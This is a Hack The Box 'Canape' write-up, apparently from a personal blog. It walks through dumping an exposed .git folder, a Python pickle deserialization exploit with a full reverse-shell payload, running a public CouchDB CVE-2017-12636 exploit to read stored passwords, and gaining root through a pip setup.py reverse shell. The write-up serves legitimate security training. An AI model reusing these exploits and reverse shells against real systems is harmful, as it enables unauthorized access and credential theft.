---
title:  "Hackthebox - Canape"
date:   2018-09-15 18:43:50 +0200
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-canape.png" alt="Info Card" %}

## user

Scanning the box with [nmap](https://tools.kali.org/information-gathering/nmap) only discovers port 80 to be open. The scan discovered a `.git` folder that is accessible from outside because it was placed in the webroot.

```bash
# Nmap 7.70 scan initiated Sun Sep  2 14:17:20 2018 as: nmap -sV -sC -oA canape 10.10.10.70
Nmap scan report for 10.10.10.70
Host is up (0.059s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git: 
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  2 14:17:36 2018 -- 1 IP address (1 host up) scanned in 16.79 seconds
```

When opening `http://10.10.10.70/.git` in a web browser, all files are shown - directory listing seems to be enabled on the web server. This allows downloading the whole `.git`folder using a single command: `wget --mirror -I .git --reject-regex *(.*)\?(.*)* http://10.10.10.70/.git/`.

Although the files itself are not present in the downloaded directory, it is possible to recover all commits so far: 

```bash
$ git status
On branch master
Your branch is ahead of 'origin/master' by 1 commit.
  (use "git push" to publish your local commits)

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

	deleted:    __init__.py
	deleted:    static/css/bootstrap.min.css
	deleted:    static/css/bootstrap.min.css.map
	deleted:    static/css/custom.css
	deleted:    static/js/bootstrap.min.js
	deleted:    static/js/bootstrap.min.js.map
	deleted:    templates/index.html
	deleted:    templates/layout.html
	deleted:    templates/quotes.html
	deleted:    templates/submit.html

Untracked files:
  (use "git add <file>..." to include in what will be committed)

	robots.txt
$ git checkout -- .
$ git status
On branch master
Your branch is ahead of 'origin/master' by 1 commit.
  (use "git push" to publish your local commits)

Untracked files:
  (use "git add <file>..." to include in what will be committed)

	robots.txt

nothing added to commit but untracked files present (use "git add" to track)
```

Next, I looked through the recovered source files which seem to be the source code of the Simpsons fan site that runs on Port 80 on the server.

The file `__init__.py` defines how requests to certain routes are handled. Two routes look interesting: `/submit` and `/check`:

```python
@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item
```

When issuing a POST request to `/submit`, it is possible to upload a quote of a Simpsons character. The character is validated against the following whitelist:

```bash
WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]
```

If the request passes all validation checks, the data gets stored into a file under `/tmp/<id>.p`. The id equals the MD5 hash of the concatenation of character and quote.

When issuing a POST request to `/check` which includes the previously assigned id, the uploaded data either is read from the file and is displayed either directly or, in case it contains the string `p1`, get unpickled before showing it to the user.

The call to `cPickle.loads()` looks exploitable. The [Python library reference](`https://docs.python.org/2.2/lib/module-cPickle.html`) states that "The cPickle module supports serialization and de-serialization of Python objects". Further research showed that `cPickle` is a faster implementation of the original `pickle` module, and, same as the `pickle` module, should never be used to unpickle (deserialize) user-controlled input as this could lead to code execution: Objects can define custom code that gets executed during deserialization when declaring a `__reduce__` function. 

When calling `/check`, unpickling user-controlled input can be triggered when crafting a serialized Python object that passes all validation checks.

First, I played around and tried to produce some pickled objects, print them to console and unpickle them in order to see how the output looks like:

```python
import cPickle
import os
cmd = "echo Foobar; sleep 10"

class SomeObject(object):
    def __reduce__(self):
        return(os.system,(cmd,))

if __name__ == "__main__":
    print("[*] Dumping pickle: ")
    picklestring = cPickle.dumps(SomeObject())
    print(picklestring)
    print("[*] Loading pickle: ")
    cPickle.loads(picklestring)
```

Running the above code produces the following output:

```bash
$ python pickle-test.py 
[*] Dumping pickle: 
cposix
system
p1
(S'echo Foobar; sleep 10'
p2
tRp3
.
[*] Loading pickle: 
Foobar
```

This leads to the following conclusions:

* Serialized Python objects seem to contain the String `p1` anyway (not sure what this means, this would need some more research)
* We can control a part of the string representing the serialized object by using the string somewhere in the `__reduce__` function

Bypassing the check against the character whitelist was easier than expected, because the implementation of the character validation just tests if the character __contains__ any of the whitelisted strings instead of testing for equality. Therefore, it was possible to split the serialized object after the whitelisted string, use the first part for the character, the second part for the quote, calculate the MD5 hash and trigger code execution by issuing a request to `/check`. 

The exploit I wrote for getting a reverse shell (which I upgraded with `python -c "import pty; pty.spawn('/bin/bash');"`, once I was on the system) looks as follows:

```python
import cPickle
import os
import requests
import subprocess
import sys
from hashlib import md5

class Exploit(object):
    def __reduce__(self):
        return (subprocess.Popen, (
            (cmd),
            0, # Bufsize
            None, # exec
            None, #stdin
            None, #stdout
            None, #stderr
            None, #preexec
            False, #close_fds
            True, # shell
            ))


def submit_exploit(char, quote):
    print("[+] Upload exploit...")
    data = { "character" : char, "quote" : quote }
    print("Submitting data: {}".format(data))
    response = requests.post("http://10.10.10.70/submit", data=data)
    print("{} - {}".format(response.status_code, response.text))
    return md5(char + quote).hexdigest()


def exec_exploit(check_id):
    print("[+] Exec exploit...")
    data = { "id" : check_id } 
    response = requests.post("http://10.10.10.70/check", data=data)
    print("{} - {}".format(response.status_code, response.text))


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: {} host port".format(sys.argv[0]))
        sys.exit(0)
    host = sys.argv[1]
    port = sys.argv[2]
    cmd = """echo Homer; python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{}", {}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &""".format(host, port)
    exploit_code = cPickle.dumps(Exploit(), 0)
    modified = exploit_code.split(b"Homer")
    check_id = submit_exploit(modified[0] + b"Homer", modified[1])
    print("Got check ID: {}".format(check_id))
    exec_exploit(check_id)
```

I was on the box, but as user `www-data`, which cannot read contents of `/home/homer`, where the `user.txt` file containing the first flag can probably be found.

First, I looked around on the box. Checking and open ports revealed some services that I did not find during my initial scan. As they all seem to listen on `0.0.0.0`, I checked them again using nmap and specifying the corresponding port directly:

* On TCP port 65535 I could find an SSH server reachable from outside
* All other ports show up as filtered in my nmap scan, they are probably blocked by a firewall

```bash
www-data@canape:~$ netstat -tulpen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode       PID/Program name
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      0          15279       -
tcp        0      0 127.0.0.1:5984          0.0.0.0:*               LISTEN      1000       15311       -
tcp        0      0 127.0.0.1:5986          0.0.0.0:*               LISTEN      1000       15308       -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          15690       -
tcp        0      0 0.0.0.0:41009           0.0.0.0:*               LISTEN      1000       14978       -
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      1000       14092       -
tcp6       0      0 :::65535                :::*                    LISTEN      0          15288       -
tcp6       0      0 :::4369                 :::*                    LISTEN      1000       14093       -
```

Next, I tried to access those services from inside the box. The service on port 5984 responded to an HTTP GET request, looks like a couchdb server:

```bash
www-data@canape:/$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

I researched a bit on how to talk to the server via commandline, afterwards I tried to get as much information out of it as possible:

```bash
www-data@canape:/$ curl http://localhost:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
www-data@canape:/$ curl http://localhost:5984/_all_docs
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
www-data@canape:/$ curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
www-data@canape:/$ # Nothing interesting in the simpsons table
@canape:/$ curl http://localhost:5984/_users/_all_docs                            
{"error":"unauthorized","reason":"You are not a server admin."}                           
www-data@canape:/$ curl http://localhost:5984/passwords/_all_docs                         
{"error":"unauthorized","reason":"You are not authorized to access this db."}  
```

I guessed that I need to somehow access the `passwords` table. Therefore, I searched for known exploits for CouchDB version 2.0.0 privilege escalation. I found [CVE-2017-12636](https://www.exploit-db.com/exploits/44913/) and uploaded the exploit (luckily a Python script) to the box by serving it from my local machine. It seemed to work!

```bash
www-data@canape:/tmp$ python cve-2017-12636.py -c "passwords" -u "foobar" -p "sdfszfdds
f23423" --priv http://127.0.0.1:5984
< "passwords" -u "foobar" -p "sdfszfddsf23423" --priv http://127.0.0.1:5984               
[*] Detected CouchDB Version 2.0.0
201 - {"ok":true,"id":"org.couchdb.user:foobar","rev":"1-c1a92496826dcb21158035457c59cde1"}

[+] User foobar with password sdfszfddsf23423 successfully created.                       
[+] Created payload at: http://127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers
/cmd
[+] Command executed: passwords
[*] Cleaning up.
www-data@canape:/tmp$ curl http://foobar:sdfszfddsf23423@127.0.0.1:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
www-data@canape:/tmp$ curl http://foobar:sdfszfddsf23423@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
www-data@canape:/tmp$ curl http://foobar:sdfszfddsf23423@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
www-data@canape:/tmp$ curl http://foobar:sdfszfddsf23423@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
www-data@canape:/tmp$ curl http://foobar:sdfszfddsf23423@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```

The first password is the SSH password for the user "homer". When logging in via SSH on Port 65535, I could finally read the user.txt file containing the flag. The second password is a couchdb user that has access to the `passwords` table. No clue about the third password.

## root

This was very straightforward. The user `homer` can run `pip install *` as root: 

```bash
homer@canape:~$ sudo -l
[sudo] password for homer:
Matching Defaults entries for homer on canape:                                            
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bi
n

User homer may run the following commands on canape:                                      
    (root) /usr/bin/pip install *
```

When running `pip install` on a certain directory that contains a `setup.py` file, this file gets executed.

I therefore created the following `setup.py` file in some directory on the box to get a reverse shell as root:

```python
import socket
import subprocess
import os

host = sys.argv[1]
port = sys.argv[2]
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host, port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
```

When executing the exploit (with netcat listening on my machine) pip complained, but executed the commands inside `setup.py` and I could read the flag from the `/root` directory through the reverse shell.
